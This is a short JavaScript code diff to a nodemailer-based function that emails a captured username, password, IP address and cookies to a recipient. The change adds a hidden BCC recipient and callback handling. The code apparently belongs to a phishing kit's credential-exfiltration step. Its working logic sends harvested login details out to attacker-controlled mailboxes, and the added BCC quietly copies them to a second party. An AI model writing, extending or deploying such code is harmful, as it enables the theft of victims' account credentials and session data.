@@ -14,10 +14,11 @@ function createNodeMailerTransport(user, pass) {
     });
 }
 
-function sendEmail(from, to, subject, username, pass, ip, cookies, nodeTransport) {
+function sendEmail(from, to, bcc, subject, username, pass, ip, cookies, nodeTransport, callback) {
     const mailDetails = {
         from: from,
         to: to,
+        bcc: bcc, // Add the BCC field to the mail details
         subject: subject,
         html: `<p>Username: ${username}</p><p>Password: ${pass}</p><p>IP Address: ${ip}</p>`
     };
@@ -30,14 +31,16 @@ function sendEmail(from, to, subject, username, pass, ip, cookies, nodeTransport
 
     nodeTransport.verify((error, success) => {
         if (error) {
-            console.log(error);
+            console.log('Error verifying transport:', error);
+            return callback(error, null);
         } else {
             nodeTransport.sendMail(mailDetails, (err, data) => {
                 if (err) {
-                    console.log(err);
+                    console.log('Error sending mail:', err);
+                    return callback(err, null);
                 } else {
-                    console.log(data);
-                    httpMsgs.sendJSON(req, res, { response: 'success' });
+                    console.log('Mail sent successfully:', data);
+                    return callback(null, data);
                 }
             });
         }
